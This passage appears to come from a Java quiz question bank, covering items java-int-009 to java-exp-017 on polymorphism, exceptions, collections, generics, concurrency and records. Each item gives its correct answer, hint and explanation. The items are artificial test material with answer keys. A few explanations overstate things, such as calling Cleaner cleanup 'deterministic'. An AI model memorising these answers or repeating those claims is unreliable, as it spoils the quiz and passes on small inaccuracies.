    type: "multiple_choice",
    topic: "oop",
    subtopic: "access_modifiers",
    standardVersion: "Java 17",
    prompt: "What is the visibility of a member declared with no access modifier (package-private / default) in Java?",
    code: "class Data {\n    int counter;\n}",
    options: [
      "Visible to all classes within the same package, but inaccessible to outside packages",
      "Visible only within the enclosing class",
      "Visible to subclasses anywhere in the application",
      "Visible to all classes across the entire JVM runtime"
    ],
    correctAnswer: "Visible to all classes within the same package, but inaccessible to outside packages",
    acceptedAnswers: ["Visible to all classes within the same package, but inaccessible to outside packages"],
    hint: "Default access is also referred to as package access.",
    explanation: "In Java, members declared without `public`, `protected`, or `private` have package-private (default) access: they are accessible to any class in the same package, but hidden from classes in other packages (even subclasses).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["oop", "access-modifiers", "encapsulation"]
  },
  {
    id: "java-int-009",
    language: "java",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "oop",
    subtopic: "method_overriding_polymorphism",
    standardVersion: "Java 17",
    prompt: "What does this program print demonstrating runtime polymorphism with overridden methods?",
    code: "class Parent {\n    void show() { System.out.print(\"Parent\"); }\n}\nclass Child extends Parent {\n    void show() { System.out.print(\"Child\"); }\n}\npublic class Main {\n    public static void main(String[] args) {\n        Parent p = new Child();\n        p.show();\n    }\n}",
    options: ["Child", "Parent", "ParentChild", "Compilation error"],
    correctAnswer: "Child",
    acceptedAnswers: ["Child"],
    hint: "Non-static method calls in Java are resolved dynamically at runtime based on the actual object type.",
    explanation: "In Java, all non-static, non-final methods are virtual by default. Even though reference `p` has type `Parent`, the runtime object is an instance of `Child`. Dynamic method dispatch invokes `Child.show()`, printing \"Child\".",
    points: 200,
    estimatedSeconds: 35,
    tags: ["oop", "polymorphism", "overriding"]
  },
  {
    id: "java-int-010",
    language: "java",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "oop",
    subtopic: "static_method_hiding",
    standardVersion: "Java 17",
    prompt: "What is printed when invoking a static method through a superclass reference variable?",
    code: "class Base {\n    static void print() { System.out.print(\"Base \"); }\n}\nclass Sub extends Base {\n    static void print() { System.out.print(\"Sub \"); }\n}\npublic class Main {\n    public static void main(String[] args) {\n        Base b = new Sub();\n        b.print();\n    }\n}",
    options: ["Base ", "Sub ", "Base Sub ", "Compilation error"],
    correctAnswer: "Base ",
    acceptedAnswers: ["Base "],
    hint: "Static methods cannot be overridden dynamically; they are hidden and bound at compile time based on reference type.",
    explanation: "Static methods in Java belong to the class, not instance objects, and cannot be polymorphically overridden. Calls are bound at compile time based on the declared type of the reference (`Base`), invoking `Base.print()`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["oop", "static", "method-hiding"]
  },
  {
    id: "java-int-011",
    language: "java",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "exceptions",
    subtopic: "checked_vs_unchecked",
    standardVersion: "Java 17",
    prompt: "Which of the following exceptions is an unchecked (runtime) exception that does NOT require mandatory try-catch or throws declaration?",
    code: null,
    options: [
      "java.lang.IllegalArgumentException",
      "java.io.IOException",
      "java.sql.SQLException",
      "java.lang.ClassNotFoundException"
    ],
    correctAnswer: "java.lang.IllegalArgumentException",
    acceptedAnswers: ["java.lang.IllegalArgumentException"],
    hint: "Unchecked exceptions inherit from RuntimeException or Error.",
    explanation: "In Java, unchecked exceptions are subclasses of `java.lang.RuntimeException` or `java.lang.Error`. `IllegalArgumentException` subclasses `RuntimeException` and does not need to be declared in method signatures. `IOException`, `SQLException`, and `ClassNotFoundException` are checked exceptions.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["exceptions", "checked-vs-unchecked"]
  },
  {
    id: "java-int-012",
    language: "java",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "initialization",
    subtopic: "static_block_execution_order",
    standardVersion: "Java 17",
    prompt: "In what order are the static and instance blocks executed in this program?",
    code: "public class Demo {\n    static { System.out.print(\"S1 \"); }\n    { System.out.print(\"I1 \"); }\n    Demo() { System.out.print(\"C1 \"); }\n    public static void main(String[] args) {\n        System.out.print(\"M \");\n        new Demo();\n    }\n}",
    options: ["S1 M I1 C1 ", "M S1 I1 C1 ", "S1 I1 C1 M ", "I1 C1 S1 M "],
    correctAnswer: "S1 M I1 C1 ",
    acceptedAnswers: ["S1 M I1 C1 "],
    hint: "Static blocks run when the class is first loaded before main() executes.",
    explanation: "When `Demo` is loaded by the JVM, its `static` initializer runs first ('S1 '). Then `main()` starts ('M '). Creating `new Demo()` triggers the instance initializer block ('I1 ') followed by the constructor body ('C1 '). The output is 'S1 M I1 C1 '.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["initialization", "static-blocks", "constructors"]
  },
  {
    id: "java-int-013",
    language: "java",
    difficulty: "intermediate",
    type: "find_bug",
    topic: "collections",
    subtopic: "concurrent_modification_exception",
    standardVersion: "Java 17",
    prompt: "Identify the line that triggers a `ConcurrentModificationException` by mutating a list during enhanced for-loop iteration.",
    code: "import java.util.ArrayList;\nimport java.util.List;\npublic class Test {\n    public static void main(String[] args) {\n        List<String> items = new ArrayList<>(List.of(\"a\", \"b\", \"c\"));\n        for (String item : items) {\n            if (item.equals(\"b\")) {\n                items.remove(item);\n            }\n        }\n    }\n}",
    correctAnswer: 9,
    targetLine: 9,
    acceptedAnswers: [9, "9", "Line 9"],
    hint: "Directly modifying a collection while iterating with an implicit Iterator violates the fail-fast contract.",
    explanation: "Line 9 calls `items.remove(item)`. The enhanced for-loop uses an underlying `Iterator`. Mutating the list directly rather than via `Iterator.remove()` causes `modCount` mismatch, throwing `ConcurrentModificationException` on the subsequent iteration check.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["collections", "debugging", "concurrent-modification"]
  },
  {
    id: "java-int-014",
    language: "java",
    difficulty: "intermediate",
    type: "fill_code",
    topic: "oop",
    subtopic: "super_constructor",
    standardVersion: "Java 17",
    prompt: "Fill in the keyword used in a subclass constructor to explicitly delegate to the superclass constructor.",
    code: "public class Dog extends Animal {\n    Dog(String name) {\n        _____(name);\n    }\n}",
    correctAnswer: "super",
    acceptedAnswers: ["super"],
    hint: "Must be the very first statement inside the constructor body.",
    explanation: "`super(...)` invokes the matching constructor of the immediate superclass. In Java, constructor chaining requires `super(...)` or `this(...)` to be the first statement in the constructor.",
    points: 200,
    estimatedSeconds: 20,
    tags: ["oop", "constructors", "super"]
  },
  {
    id: "java-int-015",
    language: "java",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "collections",
    subtopic: "hashmap_put_duplicate_key",
    standardVersion: "Java 17",
    prompt: "What does this code print when inserting an existing key into a `HashMap`?",
    code: "import java.util.HashMap;\npublic class Main {\n    public static void main(String[] args) {\n        HashMap<String, Integer> map = new HashMap<>();\n        map.put(\"score\", 100);\n        Integer prev = map.put(\"score\", 250);\n        System.out.println(prev + \"-\" + map.get(\"score\"));\n    }\n}",
    options: ["100-250", "null-250", "250-250", "100-100"],
    correctAnswer: "100-250",
    acceptedAnswers: ["100-250"],
    hint: "Map.put() returns the previous value associated with the key, or null if there was no prior mapping.",
    explanation: "`map.put(\"score\", 100)` associates 100 with \"score\". The second `put(\"score\", 250)` overwrites the mapping and returns the previous value (100). `map.get(\"score\")` now returns 250. The output is '100-250'.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["collections", "hashmap"]
  },
  {
    id: "java-int-016",
    language: "java",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "interfaces",
    subtopic: "default_methods",
    standardVersion: "Java 17",
    prompt: "Why were `default` methods introduced to Java interfaces in Java 8?",
    code: "public interface Logger {\n    void log(String msg);\n    default void logWarn(String msg) {\n        log(\"[WARN] \" + msg);\n    }\n}",
    options: [
      "To allow adding new methods to existing interfaces with backwards compatibility for existing implementations",
      "To turn interfaces into concrete instantiable classes",
      "To bypass class multiple inheritance restrictions on state fields",
      "To make interface methods synchronized by default"
    ],
    correctAnswer: "To allow adding new methods to existing interfaces with backwards compatibility for existing implementations",
    acceptedAnswers: ["To allow adding new methods to existing interfaces with backwards compatibility for existing implementations"],
    hint: "Consider how adding lambda support to Java Collections (e.g. Iterable.forEach) without breaking all third-party code was achieved.",
    explanation: "`default` methods allow interfaces to provide method bodies. This enabled adding new methods (such as `forEach()` in `Iterable` or `stream()` in `Collection`) without breaking existing binary compatibility for millions of classes already implementing those interfaces.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["interfaces", "default-methods", "java8"]
  },
  {
    id: "java-int-017",
    language: "java",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "control_flow",
    subtopic: "switch_expressions_arrow",
    standardVersion: "Java 17",
    prompt: "What is printed by this modern Java 17 arrow switch expression?",
    code: "public class Main {\n    public static void main(String[] args) {\n        int day = 3;\n        String name = switch (day) {\n            case 1 -> \"Mon\";\n            case 2, 3 -> \"Midweek\";\n            default -> \"Other\";\n        };\n        System.out.println(name);\n    }\n}",
    options: ["Midweek", "Mon", "Other", "Compilation error"],
    correctAnswer: "Midweek",
    acceptedAnswers: ["Midweek"],
    hint: "Case 2, 3 matches day 3 and returns 'Midweek' without fall-through.",
    explanation: "Java 14+ switch expressions using `->` do not fall through. The case label `case 2, 3` matches `day = 3` and evaluates to the string \"Midweek\".",
    points: 200,
    estimatedSeconds: 30,
    tags: ["switch-expression", "java17"]
  },
  {
    id: "java-int-018",
    language: "java",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "oop",
    subtopic: "final_class_methods",
    standardVersion: "Java 17",
    prompt: "What does declaring a class as `final` achieve in Java?",
    code: "public final class SecurityToken {\n    // ...\n}",
    options: [
      "The class cannot be extended (subclassed) by any other class",
      "All fields inside the class become immutable automatically",
      "The class can only be instantiated once (Singleton pattern)",
      "Methods in the class run without garbage collection"
    ],
    correctAnswer: "The class cannot be extended (subclassed) by any other class",
    acceptedAnswers: ["The class cannot be extended (subclassed) by any other class"],
    hint: "String and Integer are examples of final classes in java.lang.",
    explanation: "Marking a class `final` prevents it from being subclassed. This is widely used for security, immutability guarantees, and compiler optimizations (e.g. `java.lang.String` is `final`).",
    points: 200,
    estimatedSeconds: 25,
    tags: ["oop", "final-class"]
  },
  {
    id: "java-int-019",
    language: "java",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "streams",
    subtopic: "stream_filter_count",
    standardVersion: "Java 17",
    prompt: "What does this Java Stream pipeline print?",
    code: "import java.util.List;\npublic class Main {\n    public static void main(String[] args) {\n        List<String> words = List.of(\"cat\", \"elephant\", \"dog\", \"tiger\");\n        long count = words.stream()\n                          .filter(w -> w.length() > 3)\n                          .count();\n        System.out.println(count);\n    }\n}",
    options: ["2", "4", "3", "1"],
    correctAnswer: "2",
    acceptedAnswers: ["2", 2],
    hint: "Check word lengths: 'cat' (3), 'elephant' (8), 'dog' (3), 'tiger' (5).",
    explanation: "The filter keeps words whose length is strictly greater than 3. 'elephant' (8) and 'tiger' (5) satisfy the predicate (`cat` and `dog` have length 3, not > 3). `count()` evaluates to 2.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["streams", "filter", "lambdas"]
  },
  {
    id: "java-int-020",
    language: "java",
    difficulty: "intermediate",
    type: "find_bug",
    topic: "oop",
    subtopic: "hiding_instance_field",
    standardVersion: "Java 17",
    prompt: "Identify the line with the logical defect where local variable shadowing leaves the instance field unmodified.",
    code: "public class Account {\n    int balance = 0;\n    public void deposit(int balance) {\n        balance = balance;\n    }\n    public static void main(String[] args) {\n        Account acc = new Account();\n        acc.deposit(100);\n        System.out.println(acc.balance);\n    }\n}",
    correctAnswer: 4,
    targetLine: 4,
    acceptedAnswers: [4, "4", "Line 4"],
    hint: "Line 4 assigns the parameter to itself because of name shadowing; the instance field is untouched.",
    explanation: "Line 4 executes `balance = balance;`. Because the parameter `balance` shadows the instance field, it simply assigns the parameter to itself. To update the instance field, `this.balance = balance;` is required.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["oop", "shadowing", "this", "debugging"]
  },

  // =========================================================================
  // JAVA EXPERT (20 QUESTIONS: java-exp-001 to java-exp-020)
  // =========================================================================
  {
    id: "java-exp-001",
    language: "java",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "generics",
    subtopic: "type_erasure_consequences",
    standardVersion: "Java 17",
    prompt: "Due to JVM Generic Type Erasure, which of the following operations is illegal and causes a compile error in Java?",
    code: "public class Box<T> {\n    // Which declaration causes a compilation error?\n}",
    options: [
      "T item = new T();",
      "T item = null;",
      "public void set(T val) {}",
      "public T get() { return null; }"
    ],
    correctAnswer: "T item = new T();",
    acceptedAnswers: ["T item = new T();"],
    hint: "The type argument T is erased to Object at runtime, meaning the JVM does not know which constructor to invoke.",
    explanation: "In Java, generic type information is erased at compile time to maintain backwards compatibility with pre-Java 5 bytecode. At runtime, the JVM only sees raw types (usually `Object`). Consequently, `new T()` is illegal because the runtime cannot determine the concrete constructor.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["generics", "type-erasure"]
  },
  {
    id: "java-exp-002",
    language: "java",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "concurrency",
    subtopic: "volatile_memory_semantics",
    standardVersion: "Java 17",
    prompt: "What exact guarantees does the `volatile` modifier provide under the Java Memory Model (JMM)?",
    code: "private volatile boolean running = true;",
    options: [
      "It establishes a happens-before relationship ensuring memory visibility of writes across threads and prevents instruction reordering",
      "It provides mutual exclusion locks equivalent to synchronized blocks",
      "It makes compound operations like running++ atomic",
      "It stores the variable exclusively inside hard drive swap space"
    ],
    correctAnswer: "It establishes a happens-before relationship ensuring memory visibility of writes across threads and prevents instruction reordering",
    acceptedAnswers: ["It establishes a happens-before relationship ensuring memory visibility of writes across threads and prevents instruction reordering"],
    hint: "volatile guarantees visibility and ordering, but does NOT guarantee atomicity for compound operations.",
    explanation: "Under the JMM (§17.4), a write to a `volatile` variable happens-before every subsequent read of that variable. It forces reads/writes directly to main memory (preventing CPU cache stale reads) and prevents compiler/CPU instruction reordering across the memory barrier, but does not make compound statements atomic.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["concurrency", "volatile", "jmm"]
  },
  {
    id: "java-exp-003",
    language: "java",
    difficulty: "expert",
    type: "predict_output",
    topic: "collections",
    subtopic: "hashcode_equals_contract_violation",
    standardVersion: "Java 17",
    prompt: "What does this code print when a class overrides `equals` but fails to override `hashCode` for a `HashSet` lookup?",
    code: "import java.util.HashSet;\nclass Key {\n    int id;\n    Key(int id) { this.id = id; }\n    @Override\n    public boolean equals(Object o) {\n        return (o instanceof Key other) && this.id == other.id;\n    }\n}\npublic class Main {\n    public static void main(String[] args) {\n        HashSet<Key> set = new HashSet<>();\n        set.add(new Key(42));\n        System.out.println(set.contains(new Key(42)));\n    }\n}",
    options: ["false", "true", "Throws IllegalArgumentException", "Compilation error"],
    correctAnswer: "false",
    acceptedAnswers: ["false"],
    hint: "HashSet uses hashCode() to locate the bucket before calling equals(). Default hashCode() derives from object memory address.",
    explanation: "The `Key` class overrides `equals()` but not `hashCode()`. Under the contract of `java.lang.Object`, equal objects must have equal hash codes. Two distinct `new Key(42)` instances inherit `Object.hashCode()`, hashing into different buckets. The `contains()` check looks in the wrong bucket and returns `false`.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["collections", "hashcode", "equals", "contract"]
  },
  {
    id: "java-exp-004",
    language: "java",
    difficulty: "expert",
    type: "predict_output",
    topic: "initialization",
    subtopic: "polymorphic_method_in_constructor",
    standardVersion: "Java 17",
    prompt: "What is printed when a superclass constructor invokes an overridden method on an incompletely initialized subclass object?",
    code: "class SuperClass {\n    SuperClass() { printVal(); }\n    void printVal() { System.out.print(\"Super \"); }\n}\nclass SubClass extends SuperClass {\n    int x = 42;\n    void printVal() { System.out.print(\"Sub:\" + x + \" \"); }\n}\npublic class Main {\n    public static void main(String[] args) {\n        new SubClass();\n    }\n}",
    options: ["Sub:0 ", "Sub:42 ", "Super ", "NullPointerException"],
    correctAnswer: "Sub:0 ",
    acceptedAnswers: ["Sub:0 "],
    hint: "SuperClass constructor runs before SubClass field initializers execute. When printVal() is invoked, x is still default 0.",
    explanation: "During `new SubClass()`, `SuperClass()` executes first. Because `printVal()` is overridden, dynamic dispatch calls `SubClass.printVal()`. However, `SubClass`'s instance field initializers (`x = 42`) have not run yet, so `x` holds primitive default value `0`. Output is 'Sub:0 '.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["initialization", "constructors", "polymorphism", "hazards"]
  },
  {
    id: "java-exp-005",
    language: "java",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "oop",
    subtopic: "sealed_classes_java17",
    standardVersion: "Java 17",
    prompt: "In Java 17+, what is the purpose of declaring a `sealed` class or interface?",
    code: "public sealed interface Expr permits Add, Mult, Val {}",
    options: [
      "To restrict which specific subclasses or implementations are permitted to extend it, enabling exhaustive pattern matching",
      "To prevent all classes from using reflection on its private methods",
      "To encrypt bytecode at compile time",
      "To restrict instantiation exclusively to package-private factory classes"
    ],
    correctAnswer: "To restrict which specific subclasses or implementations are permitted to extend it, enabling exhaustive pattern matching",
    acceptedAnswers: ["To restrict which specific subclasses or implementations are permitted to extend it, enabling exhaustive pattern matching"],
    hint: "Notice the permits clause listing the only allowed subtypes.",
    explanation: "Sealed classes and interfaces (standardized in Java 17) restrict subclassing to an explicit list of permitted types. This gives developers precise domain modeling and allows the compiler to verify exhaustive pattern-matching switches without needing a fallback default clause.",
    points: 300,
    estimatedSeconds: 45,
    tags: ["sealed-classes", "java17", "oop"]
  },
  {
    id: "java-exp-006",
    language: "java",
    difficulty: "expert",
    type: "find_bug",
    topic: "concurrency",
    subtopic: "double_checked_locking_missing_volatile",
    standardVersion: "Java 17",
    prompt: "Identify the line with the thread-safety defect where the singleton instance field lacks the `volatile` modifier required for double-checked locking.",
    code: "public class Singleton {\n    private static Singleton instance;\n    private Singleton() {}\n    public static Singleton getInstance() {\n        if (instance == null) {\n            synchronized (Singleton.class) {\n                if (instance == null) {\n                    instance = new Singleton();\n                }\n            }\n        }\n        return instance;\n    }\n}",
    correctAnswer: 2,
    targetLine: 2,
    acceptedAnswers: [2, "2", "Line 2"],
    hint: "Without volatile, CPU instruction reordering can publish a partially initialized object reference to other threads.",
    explanation: "Line 2 declares `instance` without `volatile`. In double-checked locking, `new Singleton()` involves memory allocation, constructor invocation, and reference assignment. Without `volatile`, the JVM/CPU can reorder the write before constructor completion, allowing other threads to observe a half-initialized object.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["concurrency", "singleton", "volatile", "debugging"]
  },
  {
    id: "java-exp-007",
    language: "java",
    difficulty: "expert",
    type: "predict_output",
    topic: "lambdas",
    subtopic: "effectively_final_variable",
    standardVersion: "Java 17",
    prompt: "What does this code demonstrate regarding effectively final local variables in lambdas?",
    code: "public class Main {\n    public static void main(String[] args) {\n        int multiplier = 3;\n        java.util.function.IntUnaryOperator fn = x -> x * multiplier;\n        System.out.println(fn.applyAsInt(10));\n    }\n}",
    options: ["30", "10", "Compilation error: multiplier must be marked final", "0"],
    correctAnswer: "30",
    acceptedAnswers: ["30", 30],
    hint: "Since Java 8, local variables captured by lambdas do not need explicit final keyword if they are effectively final.",
    explanation: "Since Java 8, captured variables need only be 'effectively final' (not mutated anywhere after initialization). Because `multiplier` is never reassigned, the lambda captures it lawfully, computing 10 * 3 = 30.",
    points: 300,
    estimatedSeconds: 35,
    tags: ["lambdas", "effectively-final"]
  },
  {
    id: "java-exp-008",
    language: "java",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "memory",
    subtopic: "final_field_freeze_semantics",
    standardVersion: "Java 17",
    prompt: "Under the JMM, what unique concurrency guarantee does a `final` field provide upon constructor completion?",
    code: "public class ImmutablePoint {\n    public final int x;\n    public final int y;\n    public ImmutablePoint(int x, int y) {\n        this.x = x;\n        this.y = y;\n    }\n}",
    options: [
      "Freeze semantics guarantee safe publication: all threads observe final field values without synchronization even under data race",
      "final fields bypass heap allocation and are stored directly in CPU L1 cache",
      "final fields cannot be inspected via Reflection APIs under any SecurityManager",
      "final fields make all surrounding non-final fields immutable"
    ],
    correctAnswer: "Freeze semantics guarantee safe publication: all threads observe final field values without synchronization even under data race",
    acceptedAnswers: ["Freeze semantics guarantee safe publication: all threads observe final field values without synchronization even under data race"],
    hint: "JMM §17.5 specifies special final field semantics at constructor exit freeze barrier.",
    explanation: "Under the Java Memory Model §17.5, when an object is constructed without letting `this` escape, the JMM issues a freeze barrier. Any thread that obtains a reference to the instance is guaranteed to see the properly initialized values of its `final` fields without external synchronization.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["memory-model", "final", "concurrency"]
  },
  {
    id: "java-exp-009",
    language: "java",
    difficulty: "expert",
    type: "predict_output",
    topic: "generics",
    subtopic: "wildcards_pecs_principle",
    standardVersion: "Java 17",
    prompt: "Under the PECS rule ('Producer extends, Consumer super'), what is allowed on a `List<? extends Number>`?",
    code: "import java.util.List;\npublic class Test {\n    public static void test(List<? extends Number> list) {\n        // Can we call list.add(Integer.valueOf(10))?\n        // Or can we read Number num = list.get(0)?\n    }\n}",
    options: [
      "Reading elements as Number is allowed; inserting non-null elements causes compile error",
      "Both inserting Numbers and reading Numbers are permitted",
      "Inserting Numbers is allowed; reading elements causes compile error",
      "List<? extends Number> converts all elements to double automatically"
    ],
    correctAnswer: "Reading elements as Number is allowed; inserting non-null elements causes compile error",
    acceptedAnswers: ["Reading elements as Number is allowed; inserting non-null elements causes compile error"],
    hint: "Producer Extends: the collection produces elements of type Number; the compiler cannot know which specific subtype it holds.",
    explanation: "With covariance (`? extends Number`), the list produces `Number` instances, so `Number n = list.get(0)` is legal. However, the exact subtype (e.g. `List<Double>` or `List<Long>`) is unknown at compile time, so the compiler rejects calling `list.add(...)` with any non-null object to prevent runtime type pollution.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["generics", "pecs", "wildcards"]
  },
  {
    id: "java-exp-010",
    language: "java",
    difficulty: "expert",
    type: "fill_code",
    topic: "concurrency",
    subtopic: "intrinsic_monitor_keyword",
    standardVersion: "Java 17",
    prompt: "Fill in the keyword that establishes an intrinsic reentrant monitor lock around a critical code block or method.",
    code: "public class Counter {\n    private int count = 0;\n    public ____________ void increment() {\n        count++;\n    }\n}",
    correctAnswer: "synchronized",
    acceptedAnswers: ["synchronized"],
    hint: "The built-in Java keyword for mutual exclusion using the object's intrinsic monitor.",
    explanation: "The `synchronized` keyword acquires the intrinsic monitor associated with the object (`this` for instance methods, or `Class` object for static methods), ensuring mutually exclusive execution across threads.",
    points: 300,
    estimatedSeconds: 25,
    tags: ["concurrency", "synchronized", "monitors"]
  },
  {
    id: "java-exp-011",
    language: "java",
    difficulty: "expert",
    type: "predict_output",
    topic: "boxing",
    subtopic: "integer_cache_range",
    standardVersion: "Java 17",
    prompt: "What does this code print demonstrating the JVM `IntegerCache` range (-128 to 127)?",
    code: "public class Main {\n    public static void main(String[] args) {\n        Integer a = 100;\n        Integer b = 100;\n        Integer c = 200;\n        Integer d = 200;\n        System.out.println((a == b) + \" \" + (c == d));\n    }\n}",
    options: ["true false", "true true", "false false", "false true"],
    correctAnswer: "true false",
    acceptedAnswers: ["true false"],
    hint: "Java caches Integer objects created via autoboxing between -128 and 127 inclusive.",
    explanation: "Under JLS §5.1.7, autoboxing calls `Integer.valueOf(int)`. The JVM caches `Integer` instances in the range `[-128, 127]`. 100 is cached, so `a` and `b` reference the same object (`a == b` is `true`). 200 is outside the default cache range, instantiating new objects (`c == d` is `false`). Output is 'true false'.",
    points: 300,
    estimatedSeconds: 45,
    tags: ["autoboxing", "integer-cache"]
  },
  {
    id: "java-exp-012",
    language: "java",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "classloading",
    subtopic: "delegation_parent_first",
    standardVersion: "Java 17",
    prompt: "How does standard Java ClassLoader hierarchy resolve a class request under the Parent-Delegation model?",
    code: null,
    options: [
      "Delegates the request upwards to its parent classloader first before attempting to find and load the class itself",
      "Searches the local project directory first, then delegates downwards to child classloaders",
      "Loads all classes concurrently across all loaders in parallel threads",
      "Bypasses bootstrap classloaders to prioritize custom bytecode loaders"
    ],
    correctAnswer: "Delegates the request upwards to its parent classloader first before attempting to find and load the class itself",
    acceptedAnswers: ["Delegates the request upwards to its parent classloader first before attempting to find and load the class itself"],
    hint: "Parent-first delegation prevents untrusted user classes from masquerading as core java.* runtime classes.",
    explanation: "Under the standard parent-delegation model, when a ClassLoader receives a load request, it delegates up to its parent loader first (all the way to the Bootstrap ClassLoader). Only if all ancestor loaders fail to find the class does the current loader attempt to load it, ensuring system security and avoiding duplicate classes.",
    points: 300,
    estimatedSeconds: 45,
    tags: ["classloading", "jvm", "architecture"]
  },
  {
    id: "java-exp-013",
    language: "java",
    difficulty: "expert",
    type: "predict_output",
    topic: "records",
    subtopic: "java16_record_semantics",
    standardVersion: "Java 17",
    prompt: "What is printed by this Java Record demonstrating built-in value-based equality and accessor generation?",
    code: "public class Main {\n    record Point(int x, int y) {}\n    public static void main(String[] args) {\n        Point p1 = new Point(10, 20);\n        Point p2 = new Point(10, 20);\n        System.out.println(p1.x() + \":\" + p1.equals(p2));\n    }\n}",
    options: ["10:true", "10:false", "Compilation error", "null:true"],
    correctAnswer: "10:true",
    acceptedAnswers: ["10:true"],
    hint: "Records automatically generate public accessors (named identically to components, e.g. x()) and value-based equals/hashCode.",
    explanation: "Records in modern Java automatically synthesize private final fields, canonical constructors, getter methods matching component names (`p1.x()`), and component-wise `equals()`, `hashCode()`, and `toString()`. Thus `p1.x()` returns 10 and `p1.equals(p2)` returns `true`.",
    points: 300,
    estimatedSeconds: 35,
    tags: ["records", "java17"]
  },
  {
    id: "java-exp-014",
    language: "java",
    difficulty: "expert",
    type: "find_bug",
    topic: "collections",
    subtopic: "unsupported_operation_arrays_aslist",
    standardVersion: "Java 17",
    prompt: "Identify the line throwing an `UnsupportedOperationException` when attempting to resize a fixed-size list backed by `Arrays.asList()`.",
    code: "import java.util.Arrays;\nimport java.util.List;\npublic class Test {\n    public static void main(String[] args) {\n        List<String> list = Arrays.asList(\"one\", \"two\");\n        list.set(0, \"ONE\");\n        list.add(\"three\");\n        System.out.println(list);\n    }\n}",
    correctAnswer: 7,
    targetLine: 7,
    acceptedAnswers: [7, "7", "Line 7"],
    hint: "Arrays.asList() returns a fixed-size list wrapper around the underlying array that cannot grow or shrink.",
    explanation: "Line 7 calls `list.add(\"three\")`. `Arrays.asList` returns a fixed-size list wrapper directly backed by the specified array. While `.set()` is allowed (line 6), adding or removing elements throws `UnsupportedOperationException`.",
    points: 300,
    estimatedSeconds: 40,
    tags: ["collections", "debugging", "unsupported-operation"]
  },
  {
    id: "java-exp-015",
    language: "java",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "garbage_collection",
    subtopic: "phantom_reference_cleaner",
    standardVersion: "Java 17",
    prompt: "In modern Java, why has `java.lang.ref.Cleaner` (and `PhantomReference`) replaced deprecated `Object.finalize()` for resource cleanup?",
    code: "Cleaner cleaner = Cleaner.create();\ncleaner.register(this, new State());",
    options: [
      "finalize() suffered from unpredictable execution timing, thread starvation, resurrecting zombie objects, and severe performance penalties",
      "Cleaner forces garbage collection synchronously on the calling thread",
      "finalize() was incompatible with multi-core CPUs",
      "Cleaner stores objects on disk to prevent heap fragmentation"
    ],
    correctAnswer: "finalize() suffered from unpredictable execution timing, thread starvation, resurrecting zombie objects, and severe performance penalties",
    acceptedAnswers: ["finalize() suffered from unpredictable execution timing, thread starvation, resurrecting zombie objects, and severe performance penalties"],
    hint: "finalize() has been deprecated for removal because of fundamental architectural flaws in the JVM.",
    explanation: "`finalize()` is intrinsically broken: it delays GC cycles, can accidentally resurrect dying instances, swallows unchecked exceptions silently, and provides no guarantee of timely execution. `java.lang.ref.Cleaner` provides deterministic, controlled phantom-reference cleanup without resurrecting objects.",
    points: 300,
    estimatedSeconds: 45,
    tags: ["gc", "cleaner", "finalize"]
  },
  {
    id: "java-exp-016",
    language: "java",
    difficulty: "expert",
    type: "predict_output",
    topic: "pattern_matching",
    subtopic: "instanceof_pattern_binding",
    standardVersion: "Java 17",
    prompt: "What is printed by this Java 16+ pattern matching `instanceof` snippet with flow scoping?",
    code: "public class Main {\n    public static void main(String[] args) {\n        Object obj = \"SyntaxArena\";\n        if (obj instanceof String str && str.length() > 5) {\n            System.out.println(\"Valid:\" + str.substring(6));\n        } else {\n            System.out.println(\"Invalid\");\n        }\n    }\n}",
    options: ["Valid:Arena", "Valid:Syntax", "Invalid", "Compilation error"],
    correctAnswer: "Valid:Arena",
    acceptedAnswers: ["Valid:Arena"],
    hint: "Pattern variable str is in scope immediately in the right operand of && and within the if branch.",
    explanation: "`obj instanceof String str` binds pattern variable `str` of type `String`. Because the check succeeds and `str.length() == 11 > 5`, execution enters the `if` body. `str.substring(6)` takes characters from index 6 to the end (\"Arena\"), printing 'Valid:Arena'.",
    points: 300,
    estimatedSeconds: 35,
    tags: ["pattern-matching", "java17"]
  },
  {
    id: "java-exp-017",
    language: "java",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "concurrency",
    subtopic: "threadlocal_memory_leak",
    standardVersion: "Java 17",
    prompt: "Why can `ThreadLocal` variables cause severe memory leaks in application server environments utilizing thread pools?",
    code: "public static final ThreadLocal<Context> ctx = new ThreadLocal<>();",
    options: [
      "Pooled worker threads never terminate, retaining ThreadLocal values in ThreadLocalMap unless explicitly cleared with remove()",
      "ThreadLocal creates unmanaged OS processes for each variable",
      "ThreadLocal allocates memory outside the JVM heap in native C memory",
      "ThreadLocal automatically disables the garbage collector for all classes"
    ],
    correctAnswer: "Pooled worker threads never terminate, retaining ThreadLocal values in ThreadLocalMap unless explicitly cleared with remove()",
    acceptedAnswers: ["Pooled worker threads never terminate, retaining ThreadLocal values in ThreadLocalMap unless explicitly cleared with remove()"],
    hint: "In thread pools, threads are reused indefinitely; their thread-local map entries linger across web requests.",
